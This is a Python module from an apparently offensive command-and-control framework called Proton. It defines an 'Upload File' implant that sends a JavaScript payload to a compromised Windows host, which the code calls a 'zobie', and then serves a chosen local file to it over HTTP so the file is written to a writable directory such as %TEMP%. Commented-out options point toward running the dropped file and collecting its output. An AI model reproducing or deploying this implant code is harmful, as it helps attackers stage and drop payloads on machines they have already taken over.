#!/usr/bin/env python3

#            ---------------------------------------------------
#                             Proton Framework              
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.job
import core.implant
import uuid, os

class UploadFileJob(core.job.Job):
    def create(self):
        last = self.options.get("LFILE").split("/")[-1]
            
        self.options.set("FILE", last)
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))

    def report(self, handler, data):
        if handler.get_header('X-UploadFileJob', False):
            if self.options.get("LFILE")[0] != '/':
                with open(os.environ['OLDPWD'] + '/' + self.options.get("LFILE"), "rb") as f:
                    fdata = f.read()
            else:
                with open(self.options.get("LFILE"), "rb") as f:
                    fdata = f.read()
            

            headers = {}
            headers['Content-Type'] = 'application/octet-stream'
            headers['Content-Length'] = len(fdata)
            handler.reply(200, fdata, headers)
            return

        super(UploadFileJob, self).report(handler, data)

    def done(self):
        self.results = self.data

    def display(self):
        pass

class UploadFileImplant(core.implant.Implant):

    NAME = "Upload File"
    DESCRIPTION = "Uploads a local file to the zobie."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/util/upload_file"

    def load(self):

        self.options.register("LFILE", "", "Local file to upload.")
        #self.options.register("FILE", "", "file name once uploaded")
        #self.options.register("EXEC", "false", "execute file?", enum=["true", "false"])
        #self.options.register("OUTPUT", "false", "get output of exec?", enum=["true", "false"])
        self.options.register("DIRECTORY", "%TEMP%", "Writeable directory.", required=False)
        self.options.register("FILE", "", "", hidden = True)

    def job(self):
        return UploadFileJob

    def run(self):
        payloads = {}

        #payloads["vbs"] = self.load_script("data/implant/util/upload_file.vbs", self.options)
        payloads["js"] = "data/implant/util/upload_file.js"

        self.dispatch(payloads, self.job)
